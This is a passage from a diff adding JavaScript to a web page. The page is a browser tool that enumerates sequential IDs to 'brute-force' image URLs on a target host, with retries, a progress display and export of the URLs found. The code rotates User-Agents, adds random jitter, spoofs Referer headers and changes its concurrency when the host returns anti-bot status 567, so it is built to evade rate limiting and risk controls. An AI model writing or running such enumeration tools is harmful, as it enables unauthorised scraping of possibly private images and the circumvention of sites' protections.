+            dom.retryBtn.classList.add("retry-running");
+            break;
+        case "done":
+            dom.retryBtn.disabled = true;
+            break;
+    }
+};
+
+// 重置函数 无修改
+const resetAllState = () => {
+    state.processed = 0;
+    state.successCount = 0;
+    state.failureCount = 0;
+    state.taskStartTime = 0;
+    state.continuousRisk567 = 0;
+    state.continuousNormalRequest = 0;
+    state.currentConcurrency = CONFIG.BASE_CONCURRENCY;
+    state.successfulUrls = [];
+    state.failedUrls = [];
+    state.retryUrlList = [];
+    state.isRetrying = false;
+    state.retryProcessed = 0;
+    state.retryTotal = 0;
+    state.retrySuccessCount = 0;
+    state.retryFailCount = 0;
+
+    dom.progressFill.style.width = "0%";
+    dom.processedCount.innerText = "0";
+    dom.successCount.innerText = "0";
+    dom.failureCount.innerText = "0";
+    dom.speed.innerText = "0.0";
+    dom.eta.innerText = "999";
+    dom.hitRate.innerText = "0.0";
+    dom.log.innerHTML = "";
+    dom.previewGrid.innerHTML = '<div class="empty-tip">暂无成功图片，开始爆破后将在此处展示</div>';
+    dom.exportBtn.disabled = true;
+
+    if (state.progressTimer) {
+        clearInterval(state.progressTimer);
+        state.progressTimer = null;
+    }
+    initDomainSemaphores();
+    updateRetryBtnState("disabled", "二次重试", "待扫描");
+};
+
+// 核心扫描逻辑 无修改
+const checkUrlValid = async (url) => {
+    const host = url.split("/")[2];
+    const hostSem = state.domainSemaphores[host];
+    if (!hostSem) return { valid: false, url, status: 'Error' };
+
+    await hostSem.acquire();
+    await randomJitter();
+
+    const headers = {
+        "Host": host,
+        "User-Agent": getRandomUA(),
+        "Accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
+        "Accept-Language": "zh-CN,zh-Hans;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Referer": `https://${host}/`,
+        "Cache-Control": "no-cache",
+        "Pragma": "no-cache"
+    };
+
+    let res = null;
+    try {
+        const controller = new AbortController();
+        const timeout = setTimeout(() => controller.abort(), CONFIG.REQUEST_TIMEOUT);
+        res = await fetch(url, {
+            headers,
+            signal: controller.signal,
+            mode: "cors",
+            cache: "no-cache",
+            redirect: CONFIG.FOLLOW_REDIRECTS ? "follow" : "manual"
+        });
+        clearTimeout(timeout);
+
+        if (res.status === 567) {
+            await adjustConcurrencyOnRisk();
+            res = await secondProbe(url, host);
+        }
+
+        if (![403, 429, 500, 503, 567].includes(res?.status || 500)) {
+            await adjustConcurrencyOnNormal();
+        }
+
+        if (res?.ok) {
+            const arrayBuffer = await res.arrayBuffer();
+            const isValid = await isValidImage(arrayBuffer);
+            if (isValid) {
+                hostSem.release();
+                return { valid: true, url, status: res.status };
+            }
+        }
+
+        hostSem.release();
+        return { valid: false, url, status: res?.status || 'Error' };
+
+    } catch (err) {
+        hostSem.release();
+        return { valid: false, url, status: err.name };
+    }
+};
+
+// ====================== 修复：成功日志仅打印ID 移除URL ======================
+const scanSingleId = async (id, sem) => {
+    if (!state.isRunning) return;
+    await sem.acquire();
+
+    const urls = buildUrls(id);
+    let isSuccess = false;
+    let successUrl = "";
+    const tempFail = [];
+
+    for (const url of urls) {
+        if (!state.isRunning) break;
+        const { valid, status } = await checkUrlValid(url);
+        if (valid) {
+            isSuccess = true;
+            successUrl = url;
+            break;
+        } else {
+            tempFail.push({ status, url });
+        }
+    }
+
+    state.processed++;
+    if (isSuccess) {
+        state.successCount++;
+        // 【修复】成功日志仅打印ID 彻底移除URL
+        addSuccessLog(`✅ 成功: ID${id}`);
+        // 先渲染预览图 再去重入库
+        addPreviewThumb(successUrl, id);
+        if (!state.successfulUrls.includes(successUrl)) {
+            state.successfulUrls.push(successUrl);
+        }
+    } else {
+        state.failureCount++;
+        state.failedUrls.push(...tempFail);
+        tempFail.forEach(item => state.retryUrlList.push(item.url));
+    }
+
+    sem.release();
+};
+
+// 并发池控制 无修改
+const runConcurrentPool = async (tasks, limit) => {
+    const sem = new Semaphore(limit);
+    const taskPromises = tasks.map(task => task(sem));
+    await Promise.all(taskPromises);
+};
+
+// 进度条刷新 无修改
+const startProgressRefresh = () => {
+    state.progressTimer = setInterval(() => {
+        if (!state.isRunning && !state.isRetrying) return;
+
+        let pct, processed, total, speed, eta, successCount, failureCount, hitRate;
+        if (state.isRetrying) {
+            pct = state.retryTotal > 0 ? (state.retryProcessed / state.retryTotal) * 100 : 0;
+            processed = state.retryProcessed;
+            total = state.retryTotal;
+            successCount = state.retrySuccessCount;
+            failureCount = state.retryFailCount;
+            const used = (Date.now() - state.retryStartTime) / 1000;
+            speed = used >= 1 ? (processed / used) : 0;
+            const remain = total - processed;
+            eta = (speed >= 0.05 && remain > 0 && used >= 1) ? Math.round(remain / speed) : 999;
+            hitRate = processed > 0 ? (successCount / processed * 100) : 0;
+        } else {
+            pct = state.totalTask > 0 ? (state.processed / state.totalTask) * 100 : 0;
+            processed = state.processed;
+            total = state.totalTask;
+            successCount = state.successCount;
+            failureCount = state.failureCount;
+            const used = (Date.now() - state.taskStartTime) / 1000;
+            speed = used >= 1 ? (processed / used) : 0;
+            const remain = total - processed;
+            eta = (speed >= 0.05 && remain > 0 && used >= 1) ? Math.round(remain / speed) : 999;
+            hitRate = processed > 0 ? (successCount / processed * 100) : 0;
+        }
+
+        dom.progressFill.style.width = `${pct}%`;
+        dom.processedCount.innerText = processed;
+        dom.successCount.innerText = successCount;
+        dom.failureCount.innerText = failureCount;
+        dom.speed.innerText = speed.toFixed(1);
+        dom.eta.innerText = eta;
+        dom.hitRate.innerText = hitRate.toFixed(1);
+
+    }, CONFIG.REFRESH_INTERVAL);
+};
+
+// ====================== 修复：重试成功日志仅打印ID 移除URL ======================
+const retrySingleUrl = async (url, sem) => {
+    if (!state.isRetrying) return;
+    await sem.acquire();
+
+    const { valid } = await checkUrlValid(url);
+    state.retryProcessed++;
+
+    if (valid) {
+        state.retrySuccessCount++;
+        const idMatch = url.match(/\/(\d+)(?:!|$)/);
+        const id = idMatch ? idMatch[1] : '未知';
+        // 【修复】重试成功日志仅打印ID 彻底移除URL
+        addSuccessLog(`✅ 重试成功: ID${id}`);
+        addPreviewThumb(url, id);
+        if (!state.successfulUrls.includes(url)) {
+            state.successfulUrls.push(url);
+        }
+    } else {
+        state.retryFailCount++;
+    }
+
+    sem.release();
+};
+
+const runRetry = async () => {
+    const uniqueRetryUrls = [...new Set(state.retryUrlList)];
+    state.retryTotal = uniqueRetryUrls.length;
+
+    if (state.retryTotal === 0) {
+        addWarningLog("无需要重试的链接");
+        return;
+    }
+
+    updateRetryBtnState("running", "重试中", "运行中");
+    state.isRetrying = true;
+    state.retryProcessed = 0;
+    state.retrySuccessCount = 0;
+    state.retryFailCount = 0;
+    state.retryStartTime = Date.now();
+    dom.startBtn.disabled = true;
+    dom.stopBtn.disabled = false;
+
+    addInfoLog(`开始批量重试失败链路，重试数量：${state.retryTotal}`);
+    startProgressRefresh();
+
+    const sem = new Semaphore(CONFIG.RETRY_CONCURRENCY);
+    const tasks = uniqueRetryUrls.map(url => async (sem) => retrySingleUrl(url, sem));
+    await runConcurrentPool(tasks, CONFIG.RETRY_CONCURRENCY);
+
+    state.isRetrying = false;
+    if (state.progressTimer) {
+        clearInterval(state.progressTimer);
+        state.progressTimer = null;
+    }
+
+    const used = (Date.now() - state.retryStartTime) / 1000;
+    addInfoLog(`全部重试执行完毕`);
+    addInfoLog(`重试统计：总请求${state.retryTotal} | 成功${state.retrySuccessCount} | 失败${state.retryFailCount} | 耗时${used.toFixed(2)}s`);
+
+    const totalUsed = (Date.now() - state.taskStartTime) / 1000;
+    addInfoLog(`\n任务结束总统计`);
+    addSuccessLog(`累计成功：${state.successCount + state.retrySuccessCount}`);
+    addErrorLog(`累计失败：${state.failureCount}`);
+    addInfoLog(`总耗时：${totalUsed.toFixed(2)} 秒`);
+
+    dom.startBtn.disabled = false;
+    dom.stopBtn.disabled = true;
+    updateRetryBtnState("done", "二次重试", "已完成");
+};
+
+// 主扫描业务逻辑 无修改
+const startScan = async () => {
+    resetAllState();
+    state.isRunning = true;
+    dom.startBtn.disabled = true;
+    dom.stopBtn.disabled = false;
+
+    const url = dom.urlVal.value.trim();
+    state.startId = parseInt(dom.startId.value) || 0;
+    state.endId = parseInt(dom.endId.value) || 0;
+    state.filePath = extractFilePath(url);
+
+    if (!state.filePath) {
+        addErrorLog("错误！请检查URL格式是否正确粘贴");
+        state.isRunning = false;
+        dom.startBtn.disabled = false;
+        dom.stopBtn.disabled = true;
+        return;
+    }
+    if (state.endId < state.startId) {
+        addErrorLog("错误！结束ID必须大于等于起始ID");
+        state.isRunning = false;
+        dom.startBtn.disabled = false;
+        dom.stopBtn.disabled = true;
+        return;
+    }
+
+    state.totalTask = state.endId - state.startId + 1;
+    state.taskStartTime = Date.now();
+    addInfoLog("开始爆破");
+    addInfoLog(`扫描范围: ID${state.startId} ~ ID${state.endId} | 总任务数: ${state.totalTask}`);
+    addInfoLog(`爆破模式: ${state.mode === "full" ? "全局统配" : "批量探测"}`);
+
+    startProgressRefresh();
+
+    const tasks = [];
+    for (let i = state.startId; i <= state.endId; i++) {
+        tasks.push(async (sem) => scanSingleId(i, sem));
+    }
+
+    await runConcurrentPool(tasks, state.currentConcurrency);
+
+    state.isRunning = false;
+    if (state.progressTimer) {
+        clearInterval(state.progressTimer);
+        state.progressTimer = null;
+    }
+
+    const usedTime = (Date.now() - state.taskStartTime) / 1000;
+    dom.progressFill.style.width = "100%";
+    addInfoLog(`扫描结束 | 总耗时: ${usedTime.toFixed(2)}s | 成功: ${state.successCount} | 失败: ${state.failureCount}`);
+
+    const uniqueRetryUrls = [...new Set(state.retryUrlList)];
+    if (uniqueRetryUrls.length > 0) {
+        updateRetryBtnState("ready", "二次重试", `可重试(${uniqueRetryUrls.length})`);
+    } else {
+        updateRetryBtnState("disabled", "二次重试", "无失败链接");
+    }
+
+    dom.startBtn.disabled = false;
+    dom.stopBtn.disabled = true;
+};
+
+// 停止扫描逻辑 无修改
+const stopScan = () => {
+    state.isRunning = false;
+    state.isRetrying = false;
+    if (state.progressTimer) {
+        clearInterval(state.progressTimer);
+        state.progressTimer = null;
+    }
+    addWarningLog("扫描/重试已手动停止");
+    dom.startBtn.disabled = false;
+    dom.stopBtn.disabled = true;
+    const uniqueRetryUrls = [...new Set(state.retryUrlList)];
+    if (uniqueRetryUrls.length > 0 && !state.isRetrying) {
+        updateRetryBtnState("ready", "二次重试", `可重试(${uniqueRetryUrls.length})`);
+    } else {
+        updateRetryBtnState("disabled", "二次重试", "已停止");
+    }
+};
+
+// 事件绑定 无修改
+document.querySelectorAll('.mode-btn[data-mode]').forEach(btn => {
+    btn.onclick = () => {
+        document.querySelectorAll('.mode-btn[data-mode]').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        state.mode = btn.dataset.mode;
+    };
+});
+
+dom.retryBtn.onclick = runRetry;
+dom.startBtn.onclick = startScan;
+dom.stopBtn.onclick = stopScan;
+dom.exportBtn.onclick = exportUrlsToTxt;
+
+// 移动端输入框兼容 无修改
+document.onkeydown = (e) => {
+    const activeElement = document.activeElement;
+    if (activeElement.tagName === 'INPUT' || activeElement.tagName === 'TEXTAREA') {
+        return;
+    }
+};
+const allInputs = document.querySelectorAll('input');
+allInputs.forEach(input => {
+    input.onkeydown = (e) => {
+        e.stopPropagation();
+    };
+});
 </script>
 </body>
 </html>
